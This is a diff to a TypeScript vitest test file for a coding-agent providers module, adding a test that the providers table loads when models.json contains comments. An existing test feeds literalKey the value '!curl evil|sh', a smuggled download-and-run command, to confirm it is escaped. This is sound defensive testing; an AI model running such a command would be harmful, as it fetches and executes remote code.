@@ -1,7 +1,11 @@
+import { mkdtempSync, writeFileSync } from "node:fs";
 import { createServer } from "node:http";
 import type { AddressInfo } from "node:net";
+import { tmpdir } from "node:os";
+import { join } from "node:path";
+import type { ModelRuntime } from "@earendil-works/pi-coding-agent";
 import { expect, test } from "vitest";
-import { findModels, literalKey, mergeProvider, validateCustomProvider } from "./providers";
+import { findModels, listProviders, literalKey, mergeProvider, validateCustomProvider } from "./providers";
 import type { CustomProvider } from "#protocol";
 
 test("a typed key stays a literal in models.json (no command, no environment variable)", () => {
@@ -9,6 +13,27 @@ test("a typed key stays a literal in models.json (no command, no environment var
   expect(literalKey("a$b")).toBe("a$$b");
   expect(literalKey("!curl evil|sh")).toBe("$!curl evil|sh");
   expect(literalKey("$ANTHROPIC_API_KEY")).toBe("$$ANTHROPIC_API_KEY");
+});
+
+test("the providers table still shows when models.json has comments, which pi accepts", () => {
+  const dir = mkdtempSync(join(tmpdir(), "tenon-providers-"));
+  writeFileSync(join(dir, "models.json"), '{\n  // my local server\n  "providers": { "local": {} }\n}');
+  const before = process.env.PI_CODING_AGENT_DIR;
+  process.env.PI_CODING_AGENT_DIR = dir;
+  // A partial runtime: listProviders reads only these members.
+  const rt = {
+    getAvailableSnapshot: () => [],
+    getProviders: () => [{ id: "local", name: "Local", auth: {}, baseUrl: "http://127.0.0.1:8080", getModels: () => [] }],
+    getProviderAuthStatus: () => ({ configured: false, source: undefined }),
+    isUsingSubscription: () => false,
+    getRegisteredProviderConfig: () => undefined,
+  } as unknown as ModelRuntime;
+  try {
+    expect(listProviders(rt)).toMatchObject([{ id: "local", custom: false }]);
+  } finally {
+    if (before === undefined) delete process.env.PI_CODING_AGENT_DIR;
+    else process.env.PI_CODING_AGENT_DIR = before;
+  }
 });
 
 test("find models: an OpenAI-style /models list, with context and embeddings marked", async () => {
